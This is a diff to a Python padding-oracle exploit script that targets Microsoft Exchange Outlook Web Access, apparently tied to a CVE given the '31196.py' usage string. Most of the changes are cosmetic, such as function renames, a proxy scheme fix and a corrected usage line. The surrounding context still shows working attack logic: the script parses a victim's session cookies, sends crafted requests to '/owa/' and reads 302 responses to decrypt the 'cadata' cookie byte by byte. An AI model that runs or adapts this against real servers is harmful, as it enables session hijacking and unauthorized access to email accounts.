@@ -41,7 +41,7 @@ class PaddingOracle(object):
                 self.history = []
                 r = 256
                 if byte_num == block_size - 1 and last_ok > 0:
-                    r = last_ok 
+                    r = last_ok
 
                 for i in reversed(range(r)):
                     test_bytes[byte_num] = i
@@ -105,7 +105,7 @@ class RunOracle(PaddingOracle):
         super(RunOracle, self).__init__(**kwargs)
         self.req = requests.session()
 
-    def check_reason(self, result):
+    def checkReason(self, result):
         if result.status_code != 302:
             print(f"\033[91m[-] {result.status_code} Error!\033[0m")
             return 1
@@ -127,7 +127,7 @@ class RunOracle(PaddingOracle):
         except requests.exceptions.RequestException as e:
             print(f"\033[93m[ReqError]: \033[0m{e}")
             sys.exit(0)
-        reason = self.check_reason(result)
+        reason = self.checkReason(result)
         if reason == 0:
             raise BadPaddingException
         elif reason == 2:
@@ -136,23 +136,24 @@ class RunOracle(PaddingOracle):
             print(f"\033[91m[-] Check Result!\033[0m")
             sys.exit(0)
 
-def get_cookies(cookies_str):
+def getCookies(cookies_str):
     cookies = dict([kv.strip().split("=", 1) for kv in cookies_str.split(";")])
     return cookies
 
 def main(argv):
     global target, headers, cookies, proxies
+
     target = f"https://{argv[1]}/owa/"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
     }
     proxies = {
         "http": "http://127.0.0.1:8080",
-        "https": "https://127.0.0.1:8080"
+        "https": "http://127.0.0.1:8080"
     }
     cookies_str = argv[2]
 
-    cookies = get_cookies(cookies_str)
+    cookies = getCookies(cookies_str)
     cipher_bytes = b64decode(cookies["cadata"].encode("latin-1"))
 
     runoracle = RunOracle()
@@ -172,4 +173,4 @@ if __name__ == "__main__":
     try:
         main(sys.argv)
     except IndexError:
-        print("Usage: python3 31196.py 1.1.1.1 'cdata=xxx; cadataTTL=yyy; ...'")
+        print("Usage: python3 31196.py 1.1.1.1 'cadata=xxx; cadataTTL=yyy; ...'")
